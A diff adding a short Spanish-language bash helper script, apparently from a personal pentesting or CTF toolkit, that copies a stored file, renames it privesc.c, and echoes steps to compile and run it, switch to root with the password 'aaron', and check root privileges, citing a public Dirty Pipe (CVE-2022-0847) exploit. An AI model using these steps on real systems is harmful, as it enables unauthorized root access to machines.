@@ -1,0 +1,24 @@
+#!/usr/bin/env bash
+
+
+
+
+#el archivo esta en noraa aqui mismo en binarios
+echo "cp /opt/4rji/bin/noraa ."
+cp /opt/4rji/bin/noraa .
+mv noraa privesc.c  
+
+echo "paso1: Renombra noraa a privesc.c (ya esta hecho, solo verificar existe)"   
+echo "ls -la"
+echo "paso2: Compila el archivo"
+echo "gcc privesc.c -o privesc"
+echo "paso3: Ejecuta el archivo"
+echo "ejecutar ./privesc"
+echo "paso4: Inicia como root"
+echo "pass:"
+echo "aaron"
+echo "paso5: Verifica si tienes privilegios de root"
+
+
+echo "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c"
+
